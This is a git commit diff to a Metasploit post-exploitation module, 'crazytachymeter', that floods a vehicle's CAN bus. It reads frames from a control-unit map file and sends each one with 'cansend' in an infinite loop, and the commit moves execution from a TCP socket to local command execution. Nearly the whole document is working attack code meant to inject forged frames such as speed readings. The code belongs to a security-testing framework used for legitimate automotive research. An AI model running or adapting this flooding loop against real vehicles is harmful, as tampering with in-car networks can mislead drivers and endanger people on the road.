3b56e156d838ebeeac952dc80521b1ffcc4fb8a5
PietroBiondi <pietro.biondi94@gmail.com>
2018-06-03 12:05:08 +0200

    Moved crazytachymeter from auxiliary to post/hardware/automotive/. On mapcanbus.txt adding more frame for increment speed. Conversion from auxiliary to post module.

--- modules/post/hardware/automotive/crazytachymeter.rb
+++ modules/post/hardware/automotive/crazytachymeter.rb
@@ -2,8 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::Tcp
+class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
@@ -14,34 +13,29 @@ class MetasploitModule < Msf::Auxiliary
       },
       'Author'         => ['Pietro Biondi'],
       'DisclosureDate' => 'May 18 2018',
-      'License'        => MSF_LICENSE,
-      'Platform'       => 'unix',
-      'Arch'           => ARCH_CMD,
+      'License'        => MSF_LICENSE
       )
     )
     register_options([
-      OptInt.new('RPORT', [ true, 'The target port']),
-      OptString.new('INTERFACE', [true, 'Interface of CAN-Bus']),
+      OptString.new('INTERFACE', [true, 'Interface of CAN-Bus', 'vcan0']),
       OptString.new('FILEMAP', [true, 'Path to FILEMAP', ::File.join(Msf::Config.data_directory, 'wordlists', 'controlUnitMapCanBus.txt')])
     ])
   end
 
   def run
-    connect
-    print_status("Connected to #{rhost}:#{rport}...")
     print_status(' -- OPENING CONTROL UNIT MAP --')
     lines = []
     f = File.open(datastore['FILEMAP'], "rb")
     f.each_line do |line|
-      lines.push(line)
+      lines.push(line.strip)
     end
     f.close
     print_status(' -- Flooding -- ')
     while 1
-      lines.each_with_index{
-        |e, i|
+      lines.each{
+        |e|
         cmd = "cansend #{datastore['INTERFACE']} #{e}"
-        sock.put(cmd)
+        cmd_exec(cmd)
       }
     end
   end
